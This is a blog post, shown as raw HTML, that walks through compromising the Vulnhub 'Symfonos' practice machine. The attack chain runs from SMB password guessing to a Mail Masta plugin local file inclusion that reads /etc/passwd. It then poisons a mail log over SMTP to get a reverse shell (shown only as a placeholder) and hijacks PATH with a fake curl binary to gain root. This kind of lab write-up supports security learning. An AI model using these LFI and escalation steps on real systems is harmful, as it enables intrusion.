






<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="light"
  data-auto-appearance="true"
><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#FFFFFF" />
  
  <title>Vulnhub - Symfonos &middot; Congo</title>
    <meta name="title" content="Vulnhub - Symfonos &middot; Congo" />
  
  
  
  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
  ></script>
  
  
  
  
  
  
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
  />
  
  
  
  
  
  
  
  <meta
    name="description"
    content="
      
        Today, we are going to pwn Symfonos from Vulnhub.
      
    "
  />
  
  
  
  <link rel="canonical" href="//localhost:1313/blog/smfonos/" />
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="//localhost:1313/blog/smfonos/">
  <meta property="og:site_name" content="Congo">
  <meta property="og:title" content="Vulnhub - Symfonos">
  <meta property="og:description" content="Today, we are going to pwn Symfonos from Vulnhub.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2019-07-06T00:00:00+00:00">
    <meta property="article:modified_time" content="2019-07-06T00:00:00+00:00">

  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="Vulnhub - Symfonos">
<meta name="twitter:description" content="Today, we are going to pwn Symfonos from Vulnhub.">

  
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Blogs",
    "name": "Vulnhub - Symfonos",
    "headline": "Vulnhub - Symfonos",
    
    "abstract": "Today, we are going to pwn Symfonos from Vulnhub.",
    "inLanguage": "en",
    "url" : "\/\/localhost:1313\/blog\/smfonos\/",
    "author" : {
      "@type": "Person",
      "name": ""
    },
    "copyrightYear": "2019",
    "dateCreated": "2019-07-06T00:00:00\u002b00:00",
    "datePublished": "2019-07-06T00:00:00\u002b00:00",
    
    "dateModified": "2019-07-06T00:00:00\u002b00:00",
    
    
    
    "mainEntityOfPage": "true",
    "wordCount": "724"
  }
  </script>


  
  
  
  
  






  
  

  
  
</head>
<body
    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content"
        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
        >Skip to main content</a
      >
    </div>
    
    
      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
  <nav class="flex items-start justify-between sm:items-center">
    
    <div class="flex flex-row items-center">
      
  <a
    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
    rel="me"
    href="/"
    >Congo</a
  >

    </div>
    
    
      <ul class="flex list-none flex-col text-end sm:flex-row">
        
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href=""
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Blog</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/categories/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Categories</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/tags/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Tags</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                
                
              
            </li>
          
            
              
          
        
      </ul>
    
  </nav>
</header>

    
    <div class="relative flex grow flex-col">
      <main id="main-content" class="grow">
        
  <article>
    <header class="max-w-prose">
      
      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        Vulnhub - Symfonos
      </h1>
      
        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
          





  
  



  

  
  
    
  

  

  

  
    
  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2019-07-06 00:00:00 &#43;0000 UTC">6 July 2019</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
    

    
    
  </div>

  
  


        </div>
      
      
    </header>
    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
      
      <div class="min-h-0 min-w-0 max-w-prose grow">
        <p>Today, we are going to pwn Symfonos from Vulnhub.</p>
<!-- more -->
<h3 id="machine-setup" class="relative group">Machine Setup <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#machine-setup" aria-label="Anchor">#</a></span></h3><p>Nothing much to setup in the machine, just import it to Virtualbox and choose the networking setting as per your ease, I chose the Bridge Networking as it&rsquo;s easy to setup.</p>
<h2 id="methodology" class="relative group">Methodology <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#methodology" aria-label="Anchor">#</a></span></h2><ul>
<li>Nmap scan of the machine.</li>
<li>Checking the SMB server for files.</li>
<li>Checking Helios folder for important files.</li>
<li>Discovering the WordPress website in <code>/h3l105</code> route.</li>
<li>Scanning website for the vulnerabilities via wpscan.</li>
<li>Exloiting Mail Masta 1.0 Plugin for LFI(Local File Inclusion).</li>
<li>Enumerating SMTP server.</li>
<li>Using SMTP for getting a reverse shell thrrough <code>/var/mail/helios</code> as Helios on machine.</li>
<li>Gaining root peivileges by exploiting <code>/opt/statuscheck</code> binary.</li>
</ul>
<h1 id="nmap" class="relative group">Nmap <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#nmap" aria-label="Anchor">#</a></span></h1><p>Let&rsquo;s get started, using <code>nmap -sV -sC -A 192.168.43.12</code> reveals HTTP, SSH, SMTP, and SMB.</p>
<p>






  
  
<figure><img src="/img/symfonos/symfonosnmap.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<h1 id="smb-service-enumeration" class="relative group">SMB service enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#smb-service-enumeration" aria-label="Anchor">#</a></span></h1><p>Honestly speaking, I&rsquo;ve had some problems using <code>smbclient</code> so I usually take the help of inbulit File application connect to server feature.
So moving to File, I connectedto the server and there were two folders, first <strong>Anonymous</strong> and second <strong>Helios</strong>, Helios folder was password protected and Anonymous was avilable to everyone so I checked <strong>Anonymous</strong> folder and there was a file named as <code>attention.txt</code>.</p>
<p>






  
  
<figure><img src="/img/symfonos/symfonossmb.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>It has following information:-</p>
<hr>
<blockquote>
<p>Can users please stop using passwords like &rsquo;epidioko&rsquo;, &lsquo;qwerty&rsquo; and &lsquo;baseball&rsquo;! Next person I find using one of these passwords will be fired!</p>
</blockquote>
<p>-Zeus</p>
<hr>
<p>So, using those password one by one for helios folder reveals folder&rsquo;s files with password <code>qwerty</code>.
It has 2 files <code>research.txt</code> and <code>todo.txt</code>.</p>
<hr>
<p>research.txt</p>
<blockquote>
<p>Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.</p>
</blockquote>
<hr>
<p>Not relevant.</p>
<hr>
<p>todo.txt</p>
<blockquote>
<ol>
<li>Binge watch Dexter</li>
<li>Dance</li>
<li>Work on /h3l105</li>
</ol>
</blockquote>
<hr>
<p>There <code>/h3l105</code> is our focus.</p>
<h1 id="wordpress-enumeration" class="relative group">WordPress Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#wordpress-enumeration" aria-label="Anchor">#</a></span></h1><p>So, accesing to <code>http://192.168.43.12/h3l105</code> reveals a wordpress website with login, post, castegories and other link.</p>
<hr>
<p>Note</p>
<blockquote>
<p>When you try to acces <code>/wp-login.php</code>, you&rsquo;ll recieve a error so to resolve that add machine IP Address to your <code>/etc/hosts</code> file as <code>symfonos.local</code>.</p>
</blockquote>
<hr>
<p>Well, it&rsquo;s wordpress so <code>wpscan</code> to rescuse.
Using <code>wpscan --url http://symfonos.local/h3l105 --no-banner --no-update</code> reveals two CVEs, one is SQL Injection and other LFI vulnerability both in Mail Masta Plugin 1.0.</p>
<p>






  
  
<figure><img src="/img/symfonos/symfonoswpscan.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<h1 id="exploiting-lfi-vulnerabilty" class="relative group">Exploiting LFI Vulnerabilty <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploiting-lfi-vulnerabilty" aria-label="Anchor">#</a></span></h1><p><a href="https://www.exploit-db.com/exploits/40290" target="_blank" rel="noreferrer">Here</a>, shows LFI PoC. So implementing the PoC on <code>http://symfonos.local/h3l105</code>,</p>
<p>Visiting <code>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</code> reveals the content of <code>/etc/passwd</code>.</p>
<p>






  
  
<figure><img src="/img/symfonos/symfonosetc.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>We can also access <code>/wp-config.php</code>(this was not relevant) as well as some other files including <code>/var/mail/helios</code>.</p>
<p>I was completely clueless so I asked <a href="https://twitter.com/DCAU7" target="_blank" rel="noreferrer">@DCAU7</a> for hint, he told me that I need to use SMTP to progress from here.</p>
<h1 id="smtp-enumeration-and-reverse-shell-via-smtp" class="relative group">SMTP Enumeration and Reverse Shell via SMTP <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#smtp-enumeration-and-reverse-shell-via-smtp" aria-label="Anchor">#</a></span></h1><p>Using telnet we can connect to SMTP and we can send data to <code>/var/mail/helios</code> since it&rsquo;s accessible through LFI vulnerability.</p>
<blockquote>
<p>telnet symfonos.local 25</p>
</blockquote>
<p>Once connected we can use it to execute our php code by accessing to <code>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios</code>.</p>
<p>






  
  
<figure><img src="/img/symfonos/symfonosvarmail.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>First let&rsquo;s send a email to helios with our reverse shell</p>
<p>Using telnet we can connect to SMTP and from there we can send our reverse shell.</p>
<blockquote>
<p>telnet symfonos.local 25</p>
</blockquote>
<pre tabindex="0"><code>
MAIL FROM: Robin
RCPT TO: helios
DATA
&lt;PHP Reverse Shell&gt;
.
quit
</code></pre><p>






  
  
<figure><img src="/img/symfonos/symfonossmtp.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<h1 id="getting-user-and-root" class="relative group">Getting User and Root <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#getting-user-and-root" aria-label="Anchor">#</a></span></h1><p>So, once email will be sent we can route to <code>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios</code> and that will execute our reverse shell.</p>
<p>






  
  
<figure><img src="/img/symfonos/symfonosshell.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<blockquote>
<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
</blockquote>
<p>






  
  
<figure><img src="/img/symfonos/symfonosfind.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Reveals a interesting file <code>/opt/statuscheck</code>, so analyzing that binary reveals that it is scraping the document info of that website. Using
<code>strings statuscheck</code> reveals that it&rsquo;s using curl i.e. <code>curl -I http://localhost.com</code> which basically gives the head information of a website. I tried to search for curl privilege escalation but sadly it wasn&rsquo;t useful.
I was stuck at this but <a href="https://twitter.com/0xmzfr" target="_blank" rel="noreferrer">@mzfr</a> gave me a hint that it&rsquo;s something that we have done before.</p>
<p>






  
  
<figure><img src="/img/symfonos/symfonosstrings.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>So, that helped me a lot. I chnaged directory to <code>/tmp</code> folder and ceated a binary named curl by using following commands:-</p>
<pre tabindex="0"><code>
$ echo $&#34;#!/bin/sh\n/bin/sh&#34; &gt; curl
$ chmod 777 curl
$ export PATH=:$(pwd)
$ /opt/statuscheck
</code></pre><p>






  
  
<figure><img src="/img/symfonos/symfonosroot.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>That was it folks.</p>
<h1 id="note" class="relative group">Note <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#note" aria-label="Anchor">#</a></span></h1><p>So, <a href="https://twittwer.com/0xmzfr" target="_blank" rel="noreferrer">@mzfr</a> gained that reverse shell in a different way than mine. So, there are two ways to gain reverse shell to the symfonos machine.
Here&rsquo;s his <a href="https://mzfr.github.io/symfonos" target="_blank" rel="noreferrer">writeup</a>.</p>

      </div>
    </section>
    <footer class="max-w-prose pt-8 print:hidden">
      
  <div class="flex">
    
    
    
    <div class="place-self-center">
      
      
      <div class="text-2xl sm:text-lg">
</div>
    </div>
  </div>


      

      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="group flex" href="/blog/fmt-bof/">
              <span
                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
                ><span class="ltr:inline rtl:hidden">&larr;</span
                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Binary Exploitation - Format String + Buffer Overflow Vulnerability</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2018-09-12 22:25:00 &#43;0000 UTC">12 September 2018</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="group flex text-right" href="/blog/friendzone/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Hack The Box - Friendzone</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2019-07-12 00:00:00 &#43;0000 UTC">12 July 2019</time>
                  
                </span>
              </span>
              <span
                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
                ><span class="ltr:inline rtl:hidden">&rarr;</span
                ><span class="ltr:hidden rtl:inline">&larr;</span></span
              >
            </a>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        
          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
            <a
              href="#the-top"
              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
              aria-label="Scroll to top"
              title="Scroll to top"
            >
              &uarr;
            </a>
          </div>
        
      </main><footer class="py-10 print:hidden">
  
  
  <div class="flex items-center justify-between">
    <div>
      
      
        <p class="text-sm text-neutral-500 dark:text-neutral-400">
            &copy;
            2024
            
        </p>
      
      
      
        <p class="text-xs text-neutral-500 dark:text-neutral-400">
          
          
          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
        </p>
      
    </div>
    <div class="flex flex-row items-center">
      
      
      
      
    </div>
  </div>
  
  
</footer>

    </div>
  </body>
</html>
